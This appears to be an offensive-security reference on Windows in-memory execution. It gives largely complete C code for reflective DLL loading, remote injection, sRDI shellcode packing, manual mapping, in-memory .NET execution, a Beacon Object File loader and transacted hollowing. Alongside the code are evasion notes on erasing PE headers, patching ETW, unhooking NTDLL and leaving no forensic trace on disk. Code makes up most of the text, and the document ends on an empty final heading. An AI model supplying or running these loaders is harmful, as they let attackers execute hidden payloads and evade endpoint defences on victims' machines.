# Reflective Loading & In-Memory Execution

## Reflective DLL Injection — Custom PE Loader

> OPSEC: 🟡 Medium
> Sysmon: No file-based events (fileless)
> ETW: Microsoft-Windows-Kernel-Audit-API-Calls (NtAllocateVirtualMemory)
> EDR Hooks: NtAllocateVirtualMemory, NtProtectVirtualMemory
> Signature: RWX memory allocation, PE header (MZ/PE) in non-image memory
> Mitigation: Erase PE headers after loading, use RW→RX staged permissions, indirect syscalls for memory ops

### Core Concept
Load a DLL entirely in memory without touching disk or using LoadLibrary. The loader performs all the steps the Windows PE loader does: section mapping, relocation, IAT resolution, TLS callbacks, entry point invocation.

### Full Implementation
```c
#include <windows.h>
#include <winnt.h>

typedef BOOL(WINAPI* tDllMain)(HINSTANCE, DWORD, LPVOID);
typedef HMODULE(WINAPI* tLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* tGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID(WINAPI* tVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* tVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

typedef struct _LOADER_APIS {
    tLoadLibraryA   pLoadLibraryA;
    tGetProcAddress pGetProcAddress;
    tVirtualAlloc   pVirtualAlloc;
    tVirtualProtect pVirtualProtect;
} LOADER_APIS;

PVOID ReflectiveLoad(PBYTE pRawDll, PLOADER_APIS pApi) {
    // 1. Parse PE headers
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pRawDll;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(pRawDll + pDos->e_lfanew);
    DWORD dwImageSize = pNt->OptionalHeader.SizeOfImage;

    // 2. Allocate memory at preferred base (or any available)
    PBYTE pBase = (PBYTE)pApi->pVirtualAlloc(
        (LPVOID)pNt->OptionalHeader.ImageBase,
        dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBase) {
        pBase = (PBYTE)pApi->pVirtualAlloc(
            NULL, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (!pBase) return NULL;

    // 3. Copy headers
    for (DWORD i = 0; i < pNt->OptionalHeader.SizeOfHeaders; i++)
        pBase[i] = pRawDll[i];

    // 4. Copy sections to correct RVAs
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData > 0) {
            PBYTE pDst = pBase + pSec[i].VirtualAddress;
            PBYTE pSrc = pRawDll + pSec[i].PointerToRawData;
            for (DWORD j = 0; j < pSec[i].SizeOfRawData; j++)
                pDst[j] = pSrc[j];
        }
    }

    // 5. Process base relocations
    ULONG_PTR delta = (ULONG_PTR)pBase - pNt->OptionalHeader.ImageBase;
    if (delta != 0) {
        DWORD dwRelocRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        if (dwRelocRVA) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pBase + dwRelocRVA);
            while (pReloc->VirtualAddress) {
                DWORD dwEntries = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pEntry = (PWORD)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < dwEntries; i++) {
                    WORD wType = pEntry[i] >> 12;
                    WORD wOffset = pEntry[i] & 0xFFF;
                    PBYTE pPatch = pBase + pReloc->VirtualAddress + wOffset;
                    if (wType == IMAGE_REL_BASED_DIR64)
                        *(PULONG_PTR)pPatch += delta;
                    else if (wType == IMAGE_REL_BASED_HIGHLOW)
                        *(PDWORD)pPatch += (DWORD)delta;
                    else if (wType == IMAGE_REL_BASED_HIGH)
                        *(PWORD)pPatch += HIWORD(delta);
                    else if (wType == IMAGE_REL_BASED_LOW)
                        *(PWORD)pPatch += LOWORD(delta);
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    // 6. Resolve imports (walk IAT)
    DWORD dwImportRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (dwImportRVA) {
        PIMAGE_IMPORT_DESCRIPTOR pImp = (PIMAGE_IMPORT_DESCRIPTOR)(pBase + dwImportRVA);
        while (pImp->Name) {
            HMODULE hDep = pApi->pLoadLibraryA((LPCSTR)(pBase + pImp->Name));
            PIMAGE_THUNK_DATA pOft = (PIMAGE_THUNK_DATA)(pBase + pImp->OriginalFirstThunk);
            PIMAGE_THUNK_DATA pFt  = (PIMAGE_THUNK_DATA)(pBase + pImp->FirstThunk);
            while (pOft->u1.AddressOfData) {
                if (pOft->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                    pFt->u1.Function = (ULONG_PTR)pApi->pGetProcAddress(
                        hDep, (LPCSTR)(pOft->u1.Ordinal & 0xFFFF));
                } else {
                    PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(pBase + pOft->u1.AddressOfData);
                    pFt->u1.Function = (ULONG_PTR)pApi->pGetProcAddress(hDep, pName->Name);
                }
                pOft++; pFt++;
            }
            pImp++;
        }
    }

    // 7. Execute TLS callbacks
    DWORD dwTlsRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (dwTlsRVA) {
        PIMAGE_TLS_DIRECTORY pTls = (PIMAGE_TLS_DIRECTORY)(pBase + dwTlsRVA);
        PIMAGE_TLS_CALLBACK* ppCallback = (PIMAGE_TLS_CALLBACK*)pTls->AddressOfCallBacks;
        if (ppCallback) {
            while (*ppCallback) {
                (*ppCallback)((PVOID)pBase, DLL_PROCESS_ATTACH, NULL);
                ppCallback++;
            }
        }
    }

    // 8. Set section permissions
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        DWORD dwProt = PAGE_READONLY;
        DWORD dwChar = pSec[i].Characteristics;
        if (dwChar & IMAGE_SCN_MEM_EXECUTE) {
            dwProt = (dwChar & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        } else if (dwChar & IMAGE_SCN_MEM_WRITE) {
            dwProt = PAGE_READWRITE;
        }
        DWORD dwOld;
        pApi->pVirtualProtect(pBase + pSec[i].VirtualAddress,
                              pSec[i].Misc.VirtualSize, dwProt, &dwOld);
    }

    // 9. Call DllMain
    DWORD dwEpRVA = pNt->OptionalHeader.AddressOfEntryPoint;
    if (dwEpRVA) {
        tDllMain pEntry = (tDllMain)(pBase + dwEpRVA);
        pEntry((HINSTANCE)pBase, DLL_PROCESS_ATTACH, NULL);
    }

    // 10. Erase PE headers to reduce detection surface
    DWORD dwOld;
    pApi->pVirtualProtect(pBase, pNt->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &dwOld);
    for (DWORD i = 0; i < pNt->OptionalHeader.SizeOfHeaders; i++) pBase[i] = 0;
    pApi->pVirtualProtect(pBase, pNt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwOld);

    return pBase;
}
```

### Remote Reflective Injection
```c
// Inject the loader + DLL into remote process
void InjectReflectiveDll(HANDLE hProcess, PBYTE pDll, DWORD dwDllSize) {
    // 1. Allocate in remote process
    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, dwDllSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // 2. Write raw DLL
    WriteProcessMemory(hProcess, pRemote, pDll, dwDllSize, NULL);
    // 3. Calculate offset to ReflectiveLoader export in DLL
    DWORD dwLoaderRVA = FindExportRVA(pDll, "ReflectiveLoader");
    // 4. Execute the loader in remote process
    CreateRemoteThread(hProcess, NULL, 0,
                       (LPTHREAD_START_ROUTINE)((PBYTE)pRemote + dwLoaderRVA),
                       pRemote, 0, NULL);
}
```

---

## sRDI — Shellcode Reflective DLL Injection

> OPSEC: 🟡 Medium
> Sysmon: Same as reflective injection + thread creation events
> ETW: Microsoft-Windows-Threat-Intelligence (VirtualAlloc in remote process)
> Signature: Executable memory with PE structure, position-independent code patterns
> Mitigation: Encrypt DLL in transit, obfuscate the bootstrap stub

### Concept
Convert a DLL into self-loading shellcode: a PIC (position-independent code) bootstrap stub is prepended to the DLL bytes. When the shellcode executes, it:

1. Finds its own location in memory (call/pop or RIP-relative)
2. Locates the embedded DLL data after the stub
3. Performs the full reflective load sequence
4. Returns to caller or continues execution

### Bootstrap Stub Structure
```
[PIC Bootstrap Stub] [Raw DLL Bytes] [Optional: User Data]
 ↓
 1. call $+5 / pop rbx → get own address
 2. Walk PEB → find kernel32.dll
 3. Walk exports → find LoadLibraryA, GetProcAddress, VirtualAlloc
 4. Calculate DLL offset = stub_base + stub_size
 5. Call ReflectiveLoad(pDll, &apis)
 6. ret or jmp to entry point
```

### sRDI Generator (converts DLL → shellcode)
```c
// Pseudo-implementation of sRDI packing
PBYTE ConvertDllToShellcode(PBYTE pDll, DWORD dwDllSize, PDWORD pdwOutputSize) {
    // Bootstrap stub (pre-compiled PIC shellcode)
    BYTE stub[] = { /* PIC bootstrap that finds APIs and calls ReflectiveLoad */ };
    DWORD dwStubSize = sizeof(stub);

    DWORD dwTotalSize = dwStubSize + dwDllSize;
    PBYTE pOutput = (PBYTE)malloc(dwTotalSize);

    // Copy stub
    memcpy(pOutput, stub, dwStubSize);

    // Patch DLL offset into stub
    *(PDWORD)(pOutput + STUB_DLL_OFFSET_FIELD) = dwStubSize;
    *(PDWORD)(pOutput + STUB_DLL_SIZE_FIELD) = dwDllSize;

    // Append raw DLL
    memcpy(pOutput + dwStubSize, pDll, dwDllSize);

    *pdwOutputSize = dwTotalSize;
    return pOutput;
}
```

---

## Manual Mapping (NtCreateSection)

> OPSEC: 🟢 Low
> Sysmon: No VirtualAlloc/VirtualProtect pattern in logs
> ETW: NtCreateSection / NtMapViewOfSection calls
> EDR Hooks: NtCreateSection, NtMapViewOfSection
> Signature: Section object with execute permission not backed by file
> Mitigation: Use indirect syscalls for section operations, per-section RW→RX transition

### Section-Based PE Loading
```c
#include <windows.h>
typedef NTSTATUS(NTAPI* tNtCreateSection)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
typedef NTSTATUS(NTAPI* tNtMapViewOfSection)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG);
typedef NTSTATUS(NTAPI* tNtUnmapViewOfSection)(HANDLE,PVOID);

PVOID ManualMapPE(PBYTE pRawPe) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    tNtCreateSection pNtCreateSection = (tNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    tNtMapViewOfSection pNtMapViewOfSection = (tNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    tNtUnmapViewOfSection pNtUnmapViewOfSection = (tNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pRawPe;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(pRawPe + pDos->e_lfanew);

    // Create section object large enough for image
    HANDLE hSection;
    LARGE_INTEGER liSize;
    liSize.QuadPart = pNt->OptionalHeader.SizeOfImage;
    pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &liSize,
                     PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // Map RW view for writing
    PVOID pRW = NULL;
    SIZE_T vSize = 0;
    pNtMapViewOfSection(hSection, GetCurrentProcess(), &pRW, 0, 0, NULL,
                        &vSize, 2/*ViewUnmap*/, 0, PAGE_READWRITE);

    // Copy headers + sections
    memcpy(pRW, pRawPe, pNt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData)
            memcpy((PBYTE)pRW + pSec[i].VirtualAddress,
                   pRawPe + pSec[i].PointerToRawData,
                   pSec[i].SizeOfRawData);
    }

    // Process relocations and imports (same as ReflectiveLoad above)
    // ... (apply relocations using delta = pRW - ImageBase)
    // ... (resolve imports with LoadLibraryA/GetProcAddress)

    // Unmap RW view
    pNtUnmapViewOfSection(GetCurrentProcess(), pRW);

    // Remap as RX for execution
    PVOID pRX = NULL;
    vSize = 0;
    pNtMapViewOfSection(hSection, GetCurrentProcess(), &pRX, 0, 0, NULL,
                        &vSize, 2, 0, PAGE_EXECUTE_READ);

    return pRX;
}
```

---

## .NET Assembly Loading (CLR Hosting)

> OPSEC: 🟡 Medium
> Sysmon: Event ID 7 (Image Loaded — clr.dll, clrjit.dll)
> ETW: Microsoft-Windows-DotNETRuntime (AssemblyLoad, MethodJittingStarted, etc.)
> Signature: Unmanaged process loading CLR, no .NET metadata in main executable
> Mitigation: Patch ETW before CLR initialization, use inline .NET assembly

### Full CLR Hosting Implementation
```c
#include <windows.h>
#include <metahost.h>
#include <mscoree.h>
#pragma comment(lib, "mscoree.lib")

// GUIDs
EXTERN_C const GUID CLSID_CLRMetaHost;
EXTERN_C const GUID IID_ICLRMetaHost;
EXTERN_C const GUID IID_ICLRRuntimeInfo;
EXTERN_C const GUID CLSID_CorRuntimeHost;
EXTERN_C const GUID IID_ICorRuntimeHost;

BOOL ExecuteAssemblyFromMemory(PBYTE pAssembly, DWORD dwSize, LPCWSTR pszTypeName,
                                LPCWSTR pszMethodName, LPCWSTR pszArgument) {
    ICLRMetaHost*    pMetaHost    = NULL;
    ICLRRuntimeInfo* pRuntimeInfo = NULL;
    ICorRuntimeHost* pRuntimeHost = NULL;
    IUnknown*        pAppDomainUnk = NULL;

    // 1. Create CLR MetaHost
    CLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, (LPVOID*)&pMetaHost);

    // 2. Get runtime (v4.0.30319 for .NET 4.x)
    pMetaHost->lpVtbl->GetRuntime(pMetaHost, L"v4.0.30319",
                                   &IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);

    // 3. Get runtime host interface
    pRuntimeInfo->lpVtbl->GetInterface(pRuntimeInfo, &CLSID_CorRuntimeHost,
                                        &IID_ICorRuntimeHost, (LPVOID*)&pRuntimeHost);

    // 4. Start the CLR
    pRuntimeHost->lpVtbl->Start(pRuntimeHost);

    // 5. Get default AppDomain
    pRuntimeHost->lpVtbl->GetDefaultDomain(pRuntimeHost, &pAppDomainUnk);

    // 6. QI for _AppDomain (mscorlib)
    // Using IDispatch for flexibility
    IDispatch* pAppDomain = NULL;
    pAppDomainUnk->lpVtbl->QueryInterface(pAppDomainUnk, &IID_IDispatch, (LPVOID*)&pAppDomain);

    // 7. Create SAFEARRAY from assembly bytes
    SAFEARRAYBOUND sab = { dwSize, 0 };
    SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, &sab);
    PVOID pData = NULL;
    SafeArrayAccessData(pSafeArray, &pData);
    memcpy(pData, pAssembly, dwSize);
    SafeArrayUnaccessData(pSafeArray);

    // 8. Load assembly (via _AppDomain::Load_3)
    // Using ICorRuntimeHost alternative for C compatibility:
    // Create a managed wrapper or use _AppDomain COM interface
    // Invoke: _AppDomain.Load_3(safeArray) → _Assembly
    // Then: _Assembly.EntryPoint → _MethodInfo.Invoke(null, args)

    // Cleanup
    SafeArrayDestroy(pSafeArray);
    if (pAppDomain) pAppDomain->lpVtbl->Release(pAppDomain);
    pAppDomainUnk->lpVtbl->Release(pAppDomainUnk);
    pRuntimeHost->lpVtbl->Stop(pRuntimeHost);
    pRuntimeHost->lpVtbl->Release(pRuntimeHost);
    pRuntimeInfo->lpVtbl->Release(pRuntimeInfo);
    pMetaHost->lpVtbl->Release(pMetaHost);
    return TRUE;
}
```

### Alternative: ICLRRuntimeHost::ExecuteInDefaultAppDomain
```c
// Simpler but requires DLL on disk (less OPSEC)
ICLRRuntimeHost* pClrHost = NULL;
pRuntimeInfo->lpVtbl->GetInterface(pRuntimeInfo, &CLSID_CLRRuntimeHost,
                                    &IID_ICLRRuntimeHost, (LPVOID*)&pClrHost);
pClrHost->lpVtbl->Start(pClrHost);
DWORD dwResult;
pClrHost->lpVtbl->ExecuteInDefaultAppDomain(pClrHost,
    L"C:\\payload.dll", L"Namespace.Class", L"Method", L"argument", &dwResult);
```

---

## BOF Loader (Beacon Object File)

> OPSEC: 🟢 Low
> Sysmon: Minimal — no file creation, no thread creation, no image load
> ETW: Minimal telemetry (no DLL load events)
> Signature: COFF section in memory (rare), specific symbol names (BeaconPrintf etc.)
> Mitigation: Already very low profile — obfuscate Beacon API symbol names if needed

### COFF Structure
```
COFF Header (20 bytes):
  Machine (0x8664 for x64)
  NumberOfSections
  TimeDateStamp
  PointerToSymbolTable
  NumberOfSymbols
  SizeOfOptionalHeader (0 for COFF)
  Characteristics

Section Table:
  Name, VirtualSize, VirtualAddress, SizeOfRawData,
  PointerToRawData, PointerToRelocations,
  NumberOfRelocations, Characteristics

Symbol Table:
  Name (8 bytes or string table offset)
  Value, SectionNumber, Type, StorageClass, NumberOfAuxSymbols
```

### BOF Loader Implementation
```c
#include <windows.h>
#include <winnt.h>

#pragma pack(push, 1)
typedef struct _COFF_FILE_HEADER {
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} COFF_FILE_HEADER;

typedef struct _COFF_SECTION {
    char  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} COFF_SECTION;

typedef struct _COFF_SYMBOL {
    union {
        char ShortName[8];
        struct { DWORD Zeroes; DWORD Offset; } LongName;
    } Name;
    DWORD Value;
    SHORT SectionNumber;
    WORD  Type;
    BYTE  StorageClass;
    BYTE  NumberOfAuxSymbols;
} COFF_SYMBOL;

typedef struct _COFF_RELOC {
    DWORD VirtualAddress;
    DWORD SymbolTableIndex;
    WORD  Type;
} COFF_RELOC;
#pragma pack(pop)

// Beacon API data structures
typedef struct {
    char* original;
    char* buffer;
    int   length;
    int   size;
} datap;

typedef struct {
    char* original;
    char* buffer;
    int   length;
    int   size;
} formatp;

// Beacon API stubs (provided to BOFs)
void BeaconDataParse(datap* parser, char* buffer, int size) {
    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size;
    parser->size     = size;
}

int BeaconDataInt(datap* parser) {
    if (parser->length < 4) return 0;
    int val = *(int*)parser->buffer;
    parser->buffer += 4;
    parser->length -= 4;
    return val;
}

short BeaconDataShort(datap* parser) {
    if (parser->length < 2) return 0;
    short val = *(short*)parser->buffer;
    parser->buffer += 2;
    parser->length -= 2;
    return val;
}

char* BeaconDataExtract(datap* parser, int* outLen) {
    if (parser->length < 4) return NULL;
    int len = *(int*)parser->buffer;
    parser->buffer += 4;
    parser->length -= 4;
    char* data = parser->buffer;
    parser->buffer += len;
    parser->length -= len;
    if (outLen) *outLen = len;
    return data;
}

// Output buffer for BeaconPrintf / BeaconOutput
static char g_OutputBuffer[8192];
static int  g_OutputLen = 0;

void BeaconPrintf(int type, char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    g_OutputLen += wvsprintfA(g_OutputBuffer + g_OutputLen, fmt, args);
    g_OutputLen += wsprintfA(g_OutputBuffer + g_OutputLen, "\n");
    va_end(args);
}

void BeaconOutput(int type, char* data, int len) {
    if (g_OutputLen + len < sizeof(g_OutputBuffer)) {
        memcpy(g_OutputBuffer + g_OutputLen, data, len);
        g_OutputLen += len;
    }
}

BOOL BeaconUseToken(HANDLE hToken) {
    return ImpersonateLoggedOnUser(hToken);
}

void BeaconRevertToken(void) {
    RevertToSelf();
}

BOOL BeaconIsAdmin(void) {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID pAdminSid = NULL;
    AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                             DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &pAdminSid);
    CheckTokenMembership(NULL, pAdminSid, &isAdmin);
    FreeSid(pAdminSid);
    return isAdmin;
}

// Symbol resolution table
typedef struct {
    const char* name;
    PVOID       address;
} BEACON_FUNC_MAP;

BEACON_FUNC_MAP g_BeaconApi[] = {
    { "BeaconDataParse",   (PVOID)BeaconDataParse   },
    { "BeaconDataInt",     (PVOID)BeaconDataInt      },
    { "BeaconDataShort",   (PVOID)BeaconDataShort    },
    { "BeaconDataExtract", (PVOID)BeaconDataExtract  },
    { "BeaconPrintf",      (PVOID)BeaconPrintf       },
    { "BeaconOutput",      (PVOID)BeaconOutput       },
    { "BeaconUseToken",    (PVOID)BeaconUseToken     },
    { "BeaconRevertToken", (PVOID)BeaconRevertToken  },
    { "BeaconIsAdmin",     (PVOID)BeaconIsAdmin      },
    { NULL, NULL }
};

// Resolve external symbol — check Beacon API first, then DLL imports
PVOID ResolveSymbol(const char* name) {
    // Check beacon API table
    for (int i = 0; g_BeaconApi[i].name; i++) {
        if (strcmp(name, g_BeaconApi[i].name) == 0)
            return g_BeaconApi[i].address;
    }
    // DLL import: symbol format is "__imp_LIBRARY$FunctionName"
    if (strncmp(name, "__imp_", 6) == 0) {
        const char* rest = name + 6;
        char dll[128] = {0};
        const char* dollar = strchr(rest, '$');
        if (dollar) {
            strncpy(dll, rest, dollar - rest);
            const char* func = dollar + 1;
            HMODULE hMod = LoadLibraryA(dll);
            if (hMod) return (PVOID)GetProcAddress(hMod, func);
        }
    }
    return NULL;
}

// Main BOF execution function
typedef void(*tBofGo)(char* args, int argsLen);

BOOL ExecuteBof(PBYTE pCoff, DWORD dwCoffSize, char* pArgs, int nArgsLen) {
    COFF_FILE_HEADER* pHdr = (COFF_FILE_HEADER*)pCoff;
    COFF_SECTION* pSections = (COFF_SECTION*)(pCoff + sizeof(COFF_FILE_HEADER));
    COFF_SYMBOL* pSymbols = (COFF_SYMBOL*)(pCoff + pHdr->PointerToSymbolTable);
    char* pStringTable = (char*)pSymbols + (pHdr->NumberOfSymbols * sizeof(COFF_SYMBOL));

    // 1. Allocate and copy sections
    PBYTE* ppSectionData = (PBYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                              pHdr->NumberOfSections * sizeof(PBYTE));
    for (WORD i = 0; i < pHdr->NumberOfSections; i++) {
        DWORD dwSize = pSections[i].SizeOfRawData;
        if (dwSize == 0) dwSize = pSections[i].VirtualSize;
        if (dwSize == 0) continue;
        DWORD dwProt = (pSections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
                      ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;
        ppSectionData[i] = (PBYTE)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, dwProt);
        if (pSections[i].SizeOfRawData)
            memcpy(ppSectionData[i], pCoff + pSections[i].PointerToRawData, pSections[i].SizeOfRawData);
    }

    // 2. Process relocations
    for (WORD i = 0; i < pHdr->NumberOfSections; i++) {
        if (pSections[i].NumberOfRelocations == 0) continue;
        COFF_RELOC* pRelocs = (COFF_RELOC*)(pCoff + pSections[i].PointerToRelocations);
        for (WORD r = 0; r < pSections[i].NumberOfRelocations; r++) {
            COFF_SYMBOL* pSym = &pSymbols[pRelocs[r].SymbolTableIndex];
            PBYTE pTarget = ppSectionData[i] + pRelocs[r].VirtualAddress;

            // Get symbol address
            PVOID pSymAddr = NULL;
            if (pSym->SectionNumber > 0) {
                pSymAddr = ppSectionData[pSym->SectionNumber - 1] + pSym->Value;
            } else {
                // External symbol
                const char* symName = (pSym->Name.LongName.Zeroes == 0)
                    ? pStringTable + pSym->Name.LongName.Offset
                    : pSym->Name.ShortName;
                pSymAddr = ResolveSymbol(symName);
            }
            if (!pSymAddr) continue;

            // Apply relocation
            switch (pRelocs[r].Type) {
                case IMAGE_REL_AMD64_ADDR64:
                    *(PULONG_PTR)pTarget = (ULONG_PTR)pSymAddr;
                    break;
                case IMAGE_REL_AMD64_ADDR32NB:
                    *(PDWORD)pTarget = (DWORD)((ULONG_PTR)pSymAddr - (ULONG_PTR)(pTarget + 4));
                    break;
                case IMAGE_REL_AMD64_REL32:
                    *(PDWORD)pTarget = (DWORD)((ULONG_PTR)pSymAddr - (ULONG_PTR)(pTarget + 4));
                    break;
            }
        }
    }

    // 3. Find "go" entry point
    tBofGo pGo = NULL;
    for (DWORD i = 0; i < pHdr->NumberOfSymbols; i++) {
        const char* name = (pSymbols[i].Name.LongName.Zeroes == 0)
            ? pStringTable + pSymbols[i].Name.LongName.Offset
            : pSymbols[i].Name.ShortName;
        if (strcmp(name, "go") == 0 && pSymbols[i].SectionNumber > 0) {
            pGo = (tBofGo)(ppSectionData[pSymbols[i].SectionNumber - 1] + pSymbols[i].Value);
            break;
        }
        i += pSymbols[i].NumberOfAuxSymbols;
    }

    // 4. Execute
    g_OutputLen = 0;
    if (pGo) pGo(pArgs, nArgsLen);

    // 5. Cleanup
    for (WORD i = 0; i < pHdr->NumberOfSections; i++) {
        if (ppSectionData[i]) VirtualFree(ppSectionData[i], 0, MEM_RELEASE);
    }
    HeapFree(GetProcessHeap(), 0, ppSectionData);
    return TRUE;
}
```

---

## Transacted Hollowing (TxF)

> OPSEC: 🟡 Medium
> Sysmon: Event ID 1 (Process Create) — but file on disk is clean after rollback
> ETW: Microsoft-Windows-Kernel-Transaction (TxF operations)
> Signature: NtCreateTransaction + CreateFileTransacted sequence, TxF usage is rare
> Mitigation: TxF APIs are uncommon — consider NTDLL unhooking before use

### Concept
Use NTFS Transactions (TxF) to create a "phantom" file that never persists:
1. Create transaction → write malicious PE within transaction → create section from it
2. Rollback transaction → file disappears from disk
3. Create process from section → process runs with rolled-back content
4. On-disk forensics sees nothing

### Implementation
```c
#include <windows.h>
typedef NTSTATUS(NTAPI* tNtCreateTransaction)(PHANDLE,ACCESS_MASK,PVOID,PVOID,HANDLE,ULONG,ULONG,ULONG,PVOID,PVOID);
typedef NTSTATUS(NTAPI* tNtCreateSection)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
typedef NTSTATUS(NTAPI* tNtCreateProcessEx)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,ULONG,HANDLE,HANDLE,HANDLE,ULONG);
typedef NTSTATUS(NTAPI* tRtlCreateProcessParametersEx)(PVOID*,PUNICODE_STRING,PVOID,PVOID,PVOID,PVOID,PVOID,PVOID,PVOID,PVOID,ULONG);
typedef NTSTATUS(NTAPI* tNtRollbackTransaction)(HANDLE,BOOLEAN);
typedef HANDLE(WINAPI* tCreateFileTransactedA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE,HANDLE,PVOID,PVOID);

BOOL TransactedHollowing(PBYTE pPayload, DWORD dwPayloadSize) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hK32   = GetModuleHandleA("kernel32.dll");

    tNtCreateTransaction pNtCreateTransaction =
        (tNtCreateTransaction)GetProcAddress(hNtdll, "NtCreateTransaction");
    tNtCreateSection pNtCreateSection =
        (tNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    tNtRollbackTransaction pNtRollbackTransaction =
        (tNtRollbackTransaction)GetProcAddress(hNtdll, "NtRollbackTransaction");
    tCreateFileTransactedA pCreateFileTransactedA =
        (tCreateFileTransactedA)GetProcAddress(hK32, "CreateFileTransactedA");

    // 1. Create transaction
    HANDLE hTransaction;
    pNtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS,
                         NULL, NULL, NULL, 0, 0, 0, NULL, NULL);

    // 2. Create transacted file
    CHAR szTempPath[MAX_PATH], szTempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, szTempPath);
    GetTempFileNameA(szTempPath, "txf", 0, szTempFile);

    HANDLE hFile = pCreateFileTransactedA(szTempFile, GENERIC_WRITE | GENERIC_READ,
        0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);

    // 3. Write malicious PE to transacted file
    DWORD dwWritten;
    WriteFile(hFile, pPayload, dwPayloadSize, &dwWritten, NULL);

    // 4. Create section from transacted file
    HANDLE hSection;
    pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
                     PAGE_READONLY, SEC_IMAGE, hFile);
    CloseHandle(hFile);

    // 5. Rollback transaction — file is gone
    pNtRollbackTransaction(hTransaction, TRUE);
    CloseHandle(hTransaction);

    // 6. Create process from section
    // (section still valid even after rollback)
    tNtCreateProcessEx pNtCreateProcessEx =
        (tNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");

    HANDLE hProcess;
    pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL,
                       GetCurrentProcess(), 0, hSection, NULL, NULL, 0);

    // 7. Set up process parameters and initial thread
    // (Requires NtCreateThreadEx, RtlCreateProcessParametersEx, writing PEB)
    // ... (similar to process hollowing thread setup)

    CloseHandle(hSection);
    return TRUE;
}
```

---

## PE from Memory Execution (Run EXE from Buffer)

> OPSEC: 🟡 Medium
> Sysmon: Event ID 1 (if spawning new process)
> Signature: PE header in non-image memory region
